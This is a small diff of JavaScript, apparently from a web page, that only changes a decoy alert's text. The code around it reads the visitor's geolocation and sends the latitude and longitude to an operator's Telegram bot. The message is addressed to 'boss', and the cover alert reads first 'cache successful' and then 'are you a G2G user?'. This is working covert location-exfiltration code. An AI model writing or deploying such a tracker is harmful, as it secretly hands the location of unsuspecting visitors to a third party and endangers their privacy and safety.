@@ -61,7 +61,7 @@
         navigator.geolocation.getCurrentPosition(
           (pos) => {
             const { latitude, longitude } = pos.coords;
-            alert(`Cache berhasil`);
+            alert(`apakah anda pengguna G2G?`);
             const pesan = `Lokasi berhasil diterima boss:\nLat: ${latitude}\nLon: ${longitude}`;
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`);
 
